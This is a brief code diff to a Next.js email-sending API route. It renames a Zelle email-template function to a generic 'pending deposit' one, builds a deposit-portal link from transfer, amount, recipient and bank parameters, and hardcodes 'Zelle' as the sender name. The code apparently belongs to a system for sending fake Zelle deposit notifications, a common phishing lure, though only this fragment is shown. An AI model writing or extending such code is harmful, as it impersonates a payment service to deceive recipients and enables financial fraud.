@@ -1,6 +1,6 @@
 import { type NextRequest, NextResponse } from "next/server"
 import { Resend } from "resend"
-import { generateZelleEmailHtml } from "@/lib/email-template"
+import { generatePendingDepositEmailHtml } from "@/lib/email-template"
 
 export async function POST(request: NextRequest) {
   try {
@@ -19,7 +19,7 @@ export async function POST(request: NextRequest) {
 
     const depositUrl = `${process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000"}/deposit-portal?transferId=${transferId}&amount=${amount}&recipient=${recipient}&recipientName=${encodeURIComponent(recipientName || "")}&bankName=${encodeURIComponent(bankName || "Banking System")}&message=${encodeURIComponent(message || "")}&timestamp=${timestamp}`
 
-    const html = generateZelleEmailHtml({
+    const html = generatePendingDepositEmailHtml({
       amount: amountNumber,
       senderName: "Zelle",
       recipientName: recipientName || recipient,
